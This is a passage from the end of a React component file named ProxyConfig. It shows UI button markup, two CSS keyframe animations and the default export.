                <Icon className="w-5 h-5" />
                <span className="text-[10px] font-medium">{label}</span>
              </button>
            );
          })}
        </div>
      </div>

      <style>{`
        @keyframes slide {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(300%); }
        }
        @keyframes pulse-red {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
      `}</style>
    </div>
  );
};

export default ProxyConfig;